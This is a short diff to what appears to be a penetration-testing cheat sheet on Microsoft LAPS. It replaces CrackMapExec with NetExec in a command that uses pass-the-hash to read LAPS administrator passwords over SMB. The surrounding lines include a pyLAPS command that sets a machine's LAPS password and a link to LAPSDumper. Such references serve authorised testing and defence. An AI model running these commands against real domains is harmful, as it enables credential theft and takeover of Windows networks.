@@ -61,9 +61,9 @@ Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'
        ./pyLAPS.py --action set --computer 'PC01$' -u 'Administrator' -d 'LAB.local' -p 'Admin123!' --dc-ip 192.168.2.1
        ```
      
-   * [CrackMapExec](https://github.com/mpgn/CrackMapExec):
+   * [netexec](https://github.com/Pennyw0rth/NetExec):
        ```bash
-       crackmapexec smb 10.10.10.10 -u 'user' -H '8846f7eaee8fb117ad06bdd830b7586c' -M laps
+       netexec smb 10.10.10.10 -u 'user' -H '8846f7eaee8fb117ad06bdd830b7586c' -M laps
        ```
 
    * [LAPSDumper](https://github.com/n00py/LAPSDumper) 
